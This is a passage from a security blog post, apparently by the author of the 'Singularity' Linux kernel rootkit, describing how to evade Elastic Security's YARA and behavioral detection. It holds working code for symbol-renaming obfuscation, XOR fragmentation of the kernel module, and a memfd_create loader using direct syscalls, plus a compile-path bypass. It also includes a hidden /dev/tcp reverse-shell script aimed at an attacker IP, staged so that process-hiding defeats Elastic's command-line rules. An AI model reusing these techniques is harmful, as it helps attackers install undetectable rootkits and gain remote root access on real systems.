hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral alerts:\n\u0026ldquo;Suspicious Execution via setsid and nohup\u0026rdquo; (Risk: 73) \u0026ldquo;Shell Command Execution via Kworker\u0026rdquo; (Risk: 99) Elastic\u0026rsquo;s Behavioral Rules Rule 1: Detects setsid/nohup + /dev/tcp/* patterns\nRule 2: Detects shell processes using /dev/tcp/ or /dev/udp/\nBoth rules automatically kill the process on detection.\nRule 2 Detection Logic:\nprocess where event.action == \u0026#34;exec\u0026#34; and process.name in (\u0026#34;sh\u0026#34;, \u0026#34;bash\u0026#34;, \u0026#34;zsh\u0026#34;, \u0026#34;dash\u0026#34;, \u0026#34;zmodload\u0026#34;) and process.command_line like~ (\u0026#34;*/dev/tcp/*\u0026#34;, \u0026#34;*/dev/udp/*\u0026#34;, \u0026#34;*zsh/net/tcp*\u0026#34;, \u0026#34;*zsh/net/udp*\u0026#34;) The rule scans the entire command line for /dev/tcp/ patterns, making simple obfuscation ineffective.\nOriginal Detected Code // DETECTED by Elastic snprintf(cmd, sizeof(cmd), \u0026#34;bash -c \u0026#39;\u0026#34; \u0026#34;PID=$$; \u0026#34; \u0026#34;kill -59 $PID; \u0026#34; \u0026#34;exec -a \\\u0026#34;%s\\\u0026#34; /bin/bash \u0026amp;\u0026gt;/dev/tcp/%s/%s 0\u0026gt;\u0026amp;1\u0026#34; \u0026#34;\u0026#39; \u0026amp;\u0026#34;, PROC_NAME, YOUR_SRV_IP, SRV_PORT); char *argv[] = {\u0026#34;/usr/bin/setsid\u0026#34;, \u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd, NULL}; Why detected:\nUses setsid command /dev/tcp/ appears in process arguments Shell spawned from kernel worker context Working Evasion: Staged Script Execution The solution is to separate the malicious payload from process arguments by writing the script to disk first, then executing it.\nKey Changes 1. Write the script to disk:\n#define SCRIPT_PATH \u0026#34;/singularity\u0026#34; // Hide kworker immediately add_hidden_pid(current-\u0026gt;pid); // Create script with automatic process hiding snprintf(script, sizeof(script), \u0026#34;#!/bin/bash\\n\u0026#34; \u0026#34;exec 196\u0026lt;\u0026gt;/dev/tcp/%s/%s\\n\u0026#34; \u0026#34;sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp;\\n\u0026#34; \u0026#34;SHELL_PID=$!\\n\u0026#34; \u0026#34;sleep 1\\n\u0026#34; \u0026#34;kill -59 $SHELL_PID\\n\u0026#34; \u0026#34;kill -59 $$\\n\u0026#34;, YOUR_SRV_IP, SRV_PORT); f = filp_open(SCRIPT_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0755); kernel_write(f, script, strlen(script), \u0026amp;pos); 2. Execute with clean command line:\nchar *argv[] = {\u0026#34;/bin/bash\u0026#34;, SCRIPT_PATH, NULL}; call_usermodehelper_exec(sub_info, UMH_WAIT_PROC); How It Works Step 1: The rootkit immediately hides the kworker thread executing the payload using add_hidden_pid(current-\u0026gt;pid), making the entire process chain invisible from the start.\nStep 2: It writes /singularity containing:\n#!/bin/bash exec 196\u0026lt;\u0026gt;/dev/tcp/192.168.200.164/8081 sh \u0026lt;\u0026amp;196 \u0026gt;\u0026amp;196 2\u0026gt;\u0026amp;196 \u0026amp; SHELL_PID=$! sleep 1 kill -59 $SHELL_PID kill -59 $$ The script:\nOpens TCP connection on file descriptor 196 Spawns reverse shell (sh) in background using that connection Captures the specific PID of the spawned shell: SHELL_PID=$! Waits 1 second for connection to establish Runs kill -59 $SHELL_PID to hide only the reverse shell process Runs kill -59 $$ to hide the parent bash script This approach only hides the specific processes created by the script, avoiding interference with legitimate system sh processes.\nStep 3: Execute the script. Elastic sees only:\n/bin/bash /singularity No /dev/tcp/ in the command line - detection bypassed.\nStep 4: Inside the script, automatic hiding occurs:\nReverse shell spawns in background Script captures the exact PID using $! variable Waits 1 second for connection to establish kill -59 $SHELL_PID hides only the spawned reverse shell kill -59 $$ hides the parent bash script Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.\nResult No behavioral alerts triggered\nReverse shell establishes successfully\nProcesses completely invisible to monitoring tools\nRoot privileges granted automatically\nElastic\u0026rsquo;s behavioral rules scan entire command lines for patterns like /dev/tcp/. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit\u0026rsquo;s kill -59 signal automatically handles privilege escalation and process hiding.\nConclusion This research demonstrates techniques to evade Elastic Security\u0026rsquo;s static YARA signatures and behavioral detection rules through:\nStatic Signature Evasion: Symbol randomization, module fragmentation with XOR encoding for disk-based evasion Behavioral Detection Evasion: Staged script execution and process hiding via rootkit hooks These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.\nKey Takeaways:\nSymbol Randomization breaks function name patterns in YARA rules Module Fragmentation + XOR Encoding defeats disk-based static binary analysis Ephemeral memfd Loading creates a narrow detection window (~15ms) for plaintext module Post-Load Self-Hiding prevents subsequent memory analysis of loaded module Ftrace Helper Obfuscation hides hooking framework signatures Staged Script Execution bypasses command-line behavioral detection Direct Syscalls avoid userland EDR hooks Understanding the Evasion:\nThe success of this approach relies on understanding where and when EDR tools scan:\nDisk scanning is defeated by XOR-encoded fragments Real-time memory scanning is challenged by ephemeral memfd (15ms window) Post-load analysis is blocked by rootkit self-hiding features This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.\nIf you\u0026rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.\n","permalink":"http://localhost:1313/hacking/bypassing-elastic/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://giffiles.alphacoders.com/223/223415.gif\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eSecurity solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, 